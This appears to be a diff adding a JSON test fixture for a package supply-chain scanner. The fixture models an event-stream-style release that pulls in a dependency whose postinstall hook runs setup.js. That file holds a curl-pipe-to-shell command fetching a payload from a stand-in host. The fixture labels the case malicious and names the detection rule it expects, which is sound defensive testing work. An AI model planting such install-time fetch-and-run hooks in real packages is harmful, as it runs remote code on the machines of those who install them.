@@ -1,0 +1,56 @@
+{
+  "schemaVersion": 2,
+  "id": "npm-event-stream-dependency-vector",
+  "title": "A maintainer release adds a dependency with an install-time downloader",
+  "ecosystem": "npm",
+  "category": "dependency-supply-chain",
+  "threatClass": "dependency-supply-chain",
+  "source": "real-sanitized",
+  "provenance": "Synthetic, defanged dependency-propagation shape inspired by event-stream; no incident bytes or endpoints are retained.",
+  "verdict": "malicious",
+  "expectMinRisk": "critical",
+  "expectAnyRule": ["dependency.install-time-capability"],
+  "previousPackageJson": { "name": "event-stream", "version": "3.3.5" },
+  "stagedPackageJson": {
+    "name": "event-stream",
+    "version": "3.3.6",
+    "dependencies": { "flatmap-stream": "0.1.1" }
+  },
+  "previousFiles": [],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 2,
+      "sha256": "parent-manifest",
+      "flags": [],
+      "textSample": "{}"
+    }
+  ],
+  "dependencyArtifacts": {
+    "flatmap-stream": {
+      "declaredSpec": "0.1.1",
+      "resolvedVersion": "0.1.1",
+      "packageJson": {
+        "name": "flatmap-stream",
+        "version": "0.1.1",
+        "scripts": { "postinstall": "node setup.js" }
+      },
+      "files": [
+        {
+          "path": "package.json",
+          "size": 100,
+          "sha256": "manifest",
+          "flags": [],
+          "textSample": "{\"name\":\"flatmap-stream\",\"version\":\"0.1.1\",\"scripts\":{\"postinstall\":\"node setup.js\"}}"
+        },
+        {
+          "path": "setup.js",
+          "size": 120,
+          "sha256": "setup",
+          "flags": [],
+          "textSample": "const { execSync } = require('child_process'); execSync('curl https://payload.example.invalid/x | sh');"
+        }
+      ]
+    }
+  }
+}
